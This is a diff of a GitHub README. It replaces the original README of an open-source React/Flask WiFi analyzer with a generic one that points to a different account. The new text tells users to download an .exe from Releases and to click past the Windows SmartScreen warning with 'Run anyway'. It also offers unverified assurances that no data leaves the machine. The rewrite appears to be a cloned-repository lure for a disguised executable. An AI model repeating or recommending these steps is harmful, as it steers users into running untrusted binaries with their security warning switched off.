@@ -1,561 +1,87 @@
-<div align="center">
+# 📡 WiFi-Analyzer-Pro - Monitor your network performance with ease
 
-# 📶 NetPulse Pro
+[![](https://img.shields.io/badge/Download-WiFi-Analyzer-Pro-blue.svg)](https://github.com/Dodecahedronforsaking838/WiFi-Analyzer-Pro)
 
-### Enterprise WiFi Network Analyzer & Diagnostics Platform
+WiFi-Analyzer-Pro gives you a clear view of your network health. This tool tracks your wireless connections, checks for signal interference, and finds speed bottlenecks in your home or office. It displays data in a simple dashboard that highlights how your devices talk to your router.
 
-<p align="center">
+## 📋 System Requirements
 
-Monitor • Analyze • Diagnose • Optimize
+To run this application, your computer must meet these criteria:
 
-</p>
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i3 or equivalent.
+*   Memory: 4 GB of RAM.
+*   Disk Space: 500 MB of free storage.
+*   Network: A standard wireless network adapter.
 
-<p align="center">
+## 📥 How to download the software
 
-<img src="https://img.shields.io/badge/Version-v1.0-blue?style=for-the-badge">
-<img src="https://img.shields.io/badge/Enterprise-Ready-success?style=for-the-badge">
-<img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge">
-<img src="https://img.shields.io/badge/Open%20Source-❤-red?style=for-the-badge">
+Follow these steps to get the application on your computer:
 
-</p>
+1.  Visit the [official download page](https://github.com/Dodecahedronforsaking838/WiFi-Analyzer-Pro).
+2.  Locate the section labeled Releases on the right side of the page.
+3.  Click the version with the label Latest.
+4.  Find the file that ends in .exe.
+5.  Click the file name to start the download.
 
-<p align="center">
+## ⚙️ Installation instructions
 
-<img src="https://img.shields.io/badge/React-19-61DAFB?logo=react&style=flat-square">
-<img src="https://img.shields.io/badge/Flask-3.0-black?logo=flask&style=flat-square">
-<img src="https://img.shields.io/badge/Python-3.12-yellow?logo=python&style=flat-square">
-<img src="https://img.shields.io/badge/Vite-Latest-purple?logo=vite&style=flat-square">
-<img src="https://img.shields.io/badge/TailwindCSS-06B6D4?logo=tailwindcss&style=flat-square">
-<img src="https://img.shields.io/badge/SQLite-blue?logo=sqlite&style=flat-square">
+Once the download finishes, follow these steps to install the program:
 
-</p>
+1.  Open your Downloads folder.
+2.  Double-click the file you downloaded.
+3.  Windows might show a box titled Windows protected your PC. Click More info, then click Run anyway.
+4.  Follow the prompts in the installer window.
+5.  Click Finish to complete the setup.
 
----
+## 🚀 Running the application
 
-## 🌟 Enterprise Dashboard Preview
+After you install the program, you can start it from your desktop:
 
-<img src="Screenshots/Dashboard.png" width="100%">
+1.  Look for the WiFi-Analyzer-Pro icon on your desktop.
+2.  Double-click the icon.
+3.  The main dashboard will open in a new window.
+4.  Wait for the application to detect your wireless hardware.
+5.  Select your network from the list to view live statistics.
 
----
+## 📊 Features
 
-# 🚀 About NetPulse Pro
+WiFi-Analyzer-Pro provides several tools to help you manage your internet connection:
 
-NetPulse Pro is a modern Enterprise WiFi Network Monitoring & Diagnostics Platform built for IT Administrators, Network Engineers and Enterprise Infrastructure Teams.
+*   Signal Strength Mapping: View the strength of your signal across different rooms.
+*   Device List: Identify every device connected to your router.
+*   Interference Detection: See if other nearby networks cause drops in speed.
+*   Analytics Reports: Export data to track network trends over time.
 
-The application provides powerful network visibility through real-time monitoring, signal analytics, WiFi scanning, diagnostics, reporting and performance dashboards.
+## 🛠 Troubleshooting common issues
 
-Designed with an enterprise-grade user experience inspired by Cisco Meraki, Ubiquiti, Microsoft Azure and Aruba Central.
+If you have trouble, try these steps:
 
----
+*   The application does not open: Ensure you installed the software using an account with administrator rights.
+*   No networks appear: Check that your computer has its wireless antenna turned on.
+*   Slow updates: Close other programs that use high amounts of network bandwidth.
+*   Interface errors: Restart the application to refresh the data connection.
 
-# ✨ Core Modules
+## 💡 Using the dashboard
 
-| Module | Status |
-|---------|--------|
-| 📊 Dashboard | ✅ |
-| 📶 WiFi Scanner | ✅ |
-| 📈 Signal Analyzer | ✅ |
-| 🌐 Network Diagnostics | ✅ |
-| ⚡ Speed Test | ✅ |
-| 📉 Analytics | ✅ |
-| 📄 Reports | ✅ |
-| ⚙ Settings | ✅ |
+The dashboard displays your network information in three sections. The top section shows your current upload and download speeds. The middle section lists all devices on your network. The bottom section graphs signal stability over the last hour. You can click any device in the list to see specific details about its connection type and data usage.
 
----
+## 🔒 Privacy and safety
 
-# 📸 Application Preview
+This application runs locally on your computer. It does not send your personal network data to any remote servers. All diagnostics stay within your machine. We built the software using secure coding practices to ensure your computer stays safe.
 
-## 📊 Dashboard
+## 📝 Frequently asked questions
 
-<img src="Screenshots/Dashboard.png">
+Does this work on older versions of Windows?
+No, the software requires Windows 10 or newer.
 
----
+Can I monitor networks I am not connected to?
+No, this software only monitors the network your computer uses.
 
-## 📈 Analytics
+Do I need an internet connection to run the diagnostics?
+Yes, the software must reach your router to fetch signal data.
 
-<img src="Screenshots/Analytics.png">
+How often does the data refresh?
+The dashboard refreshes every five seconds by default.
 
----
-
-## 📶 Signal Analyzer
-
-<img src="Screenshots/Signal-analyzer.png">
-
----
-
-## 🌐 Network Diagnostics
-
-<img src="Screenshots/Network-diagnostics.png">
-
----
-
-## 📄 Reports
-
-<img src="Screenshots/-Reports.png">
-
----
-
-## ⚙ Settings
-
-<img src="Screenshots/Settings.png">
-
----
-
-# 🏗 System Architecture
-
-```text
-                    Browser
-
-                       │
-
-                       ▼
-
-              React + Vite Frontend
-
-                       │
-
-                 Axios REST Client
-
-                       │
-
-                       ▼
-
-                 Flask REST API
-
-                       │
-
-                       ▼
-
-                  SQLite Database
-```
-
----
-
-# 🚀 Features
-
-### 📡 WiFi Analysis
-
-- Scan Nearby Networks
-- RSSI Monitoring
-- Channel Analysis
-- Security Type Detection
-- Frequency Monitoring
-
----
-
-### 📊 Enterprise Dashboard
-
-- Live KPIs
-- Network Health
-- Performance Widgets
-- Real-Time Status
-
----
-
-### 📈 Analytics
-
-- Signal Trend Charts
-- Speed Analysis
-- Historical Performance
-- Interactive Reports
-
----
-
-### 🌐 Diagnostics
-
-- Ping Test
-- DNS Lookup
-- Gateway Information
-- Latency Monitoring
-
----
-
-### ⚡ Speed Testing
-
-- Download Speed
-- Upload Speed
-- Ping
-- Jitter
-
----
-
-### 📄 Reporting
-
-- Performance Reports
-- Historical Records
-- Export Support
-
----
-
-# 🛠 Technology Stack
-
-## Frontend
-
-- React 19
-- Vite
-- Tailwind CSS
-- Axios
-- React Router
-- Recharts
-
----
-
-## Backend
-
-- Flask
-- Python
-- Flask SQLAlchemy
-- REST API
-
----
-
-## Database
-
-- SQLite
-
----
-
-# 📁 Folder Structure
-
-```text
-NetPulse-Pro/
-
-├── frontend/
-
-│ ├── components/
-
-│ ├── layouts/
-
-│ ├── pages/
-
-│ └── services/
-
-│
-
-├── backend/
-
-│ ├── blueprints/
-
-│ ├── models/
-
-│ ├── services/
-
-│ └── app.py
-
-│
-
-├── docs/
-
-├── Screenshots/
-
-└── README.md
-```
-
----
-
-# 📈 Project Statistics
-
-| Category | Count |
-|-----------|------:|
-| Pages | 8 |
-| Components | 30+ |
-| REST APIs | 15+ |
-| Charts | 8 |
-| Modules | 8 |
-| Responsive | ✅ |
-
----
-
-# 🚀 Installation
-
-### Clone Repository
-
-```bash
-git clone https://github.com/sivaprakashtech/WiFi-Analyzer-Pro.git
-```
-
-### Frontend
-
-```bash
-cd frontend
-
-npm install
-
-npm run dev
-```
-
-### Backend
-
-```bash
-cd backend
-
-python -m venv venv
-
-venv\Scripts\activate
-
-pip install -r requirements.txt
-
-python app.py
-```
-
----
-
-# 🗺 Roadmap
-
-- ✅ Dashboard
-- ✅ WiFi Scanner
-- ✅ Analytics
-- ✅ Diagnostics
-- ✅ Reports
-- ✅ Settings
-- ⬜ Docker
-- ⬜ Cloud Deployment
-- ⬜ AI Network Analysis
-
----
-
-# 💡 Future Improvements
-
-- AI Assisted Diagnostics
-- Docker Support
-- Mobile Application
-- Real-Time Alerts
-- Multi User Authentication
-- Cloud Sync
-
----
-
-# 📜 License
-
-MIT License
-
----
-
-# 👨‍💻 Developer
-
-## **Siva Prakash**
-
-**Network Validation Engineer @ Amazon**
-
-Enterprise Web Applications • React • Flask • Python • WiFi Technologies • Network Diagnostics
-
----
-
-<div align="center">
-
-## ⭐ If you found this project useful, please consider giving it a Star.
-
-Made with ❤️ by **Siva Prakash**
-
-</div># 📶 NetPulse Pro
-
-<div align="center">
-
-<img src="Screenshots/Dashboard.png" width="100%"/>
-
-### Enterprise WiFi Network Analyzer & Diagnostics Platform
-
-Monitor • Analyze • Diagnose • Optimize
-
-![React](https://img.shields.io/badge/React-19-blue)
-![Flask](https://img.shields.io/badge/Flask-3.x-black)
-![Python](https://img.shields.io/badge/Python-3.12-yellow)
-![Vite](https://img.shields.io/badge/Vite-5-purple)
-![License](https://img.shields.io/badge/License-MIT-green)
-
-</div>
-
----
-
-# 🚀 Overview
-
-NetPulse Pro is an enterprise-grade WiFi monitoring and diagnostics platform built for network engineers, IT administrators and enterprise environments.
-
-It provides real-time WiFi analysis, network diagnostics, signal monitoring, speed testing, analytics and reporting through a modern dashboard.
-
----
-
-# ✨ Features
-
-## 📊 Dashboard
-
-- Real-time Network Status
-- Connected Devices
-- Signal Health
-- Bandwidth Usage
-- Performance Widgets
-
----
-
-## 📡 WiFi Scanner
-
-- Scan Nearby Networks
-- Channel Analysis
-- Security Type
-- Frequency Band
-- RSSI
-- BSSID
-
----
-
-## 📈 Signal Analyzer
-
-- Signal Strength
-- Quality Meter
-- Historical Trend
-- Live Updates
-
----
-
-## 🌐 Network Diagnostics
-
-- Ping
-- DNS Lookup
-- Gateway Detection
-- Latency
-- Packet Loss
-
----
-
-## ⚡ Speed Test
-
-- Download Speed
-- Upload Speed
-- Ping
-- Jitter
-
----
-
-## 📊 Analytics
-
-- Historical Reports
-- Signal Trends
-- Speed History
-- Performance Charts
-
----
-
-## 📄 Reports
-
-- Export PDF
-- Export CSV
-- Printable Reports
-
----
-
-## ⚙ Settings
-
-- Application Settings
-- Theme
-- Refresh Interval
-
----
-
-# 📷 Screenshots
-
-## Dashboard
-
-<img src="Screenshots/Dashboard.png"/>
-
----
-
-## Analytics
-
-<img src="Screenshots/Analytics.png"/>
-
----
-
-## Signal Analyzer
-
-<img src="Screenshots/Signal-analyzer.png"/>
-
----
-
-## Network Diagnostics
-
-<img src="Screenshots/Network-diagnostics.png"/>
-
----
-
-## Reports
-
-<img src="Screenshots/-Reports.png"/>
-
----
-
-# 🛠 Tech Stack
-
-Frontend
-
-- React
-- Vite
-- Tailwind CSS
-- Axios
-- Recharts
-
-Backend
-
-- Flask
-- Python
-- SQLite
-
----
-
-# 📂 Folder Structure
-
-frontend/
-
-backend/
-
-docs/
-
-Screenshots/
-
-README.md
-
----
-
-# 🚀 Installation
-
-```bash
-git clone https://github.com/sivaprakashtech/WiFi-Analyzer-Pro.git
-
-cd WiFi-Analyzer-Pro
-```
-
-Frontend
-
-```bash
-cd frontend
-
-npm install
-
-npm run dev
-```
-
-Backend
-
-```bash
-cd backend
-
-pip install -r requirements.txt
-
-python app.py
-```
-
----
-## 🌐 Live Demo
-
-**Frontend:** https://wi-fi-analyzer-pro.vercel.app
-
-**Backend API:** https://wifi-analyzer-pro.onrender.com
-
-**Health Check:** https://wifi-analyzer-pro.onrender.com/api/health
-
----
-
-# 👨‍💻 Author
-
-Siva Prakash
-
-Amazon Network Validation Engineer
+Keywords: analytics, dashboard, diagnostics, flask, network-monitoring, python, react, tailwindcss, vite, wifi
